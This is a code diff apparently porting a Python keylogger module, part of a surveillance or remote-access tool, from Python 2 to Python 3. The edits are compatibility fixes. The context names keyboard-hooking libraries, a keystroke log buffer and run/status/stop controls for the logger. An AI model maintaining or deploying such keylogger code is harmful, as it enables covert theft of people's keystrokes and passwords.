@@ -8,7 +8,7 @@ import sys
 import time
 import Queue
 import urllib
-import StringIO
+from io import StringIO
 import threading
 import collections
 
@@ -19,7 +19,7 @@ packages = ['util','pyHook','pythoncom'] if os.name == 'nt' else ['util','pyxhoo
 platforms = ['win32','linux2','darwin']
 window = None
 max_size = 4000
-logs = StringIO.StringIO()
+logs = StringIO()
 threads = {}
 results = {}
 usage = 'keylogger <run/status/stop>'
@@ -48,7 +48,7 @@ def _event(event):
         else:
             pass
     except Exception as e:
-        util.log('{} error: {}'.format(event.func_name, str(e)))
+        util.log('{} error: {}'.format(event.__name__, str(e)))
     return True
 
 @util.threaded
@@ -76,7 +76,7 @@ def auto(mode):
             else:
                 time.sleep(1)
         except Exception as e:
-            util.log("{} error: {}".format(auto.func_name, str(e)))
+            util.log("{} error: {}".format(auto.__name__, str(e)))
             break
 
 def dump():
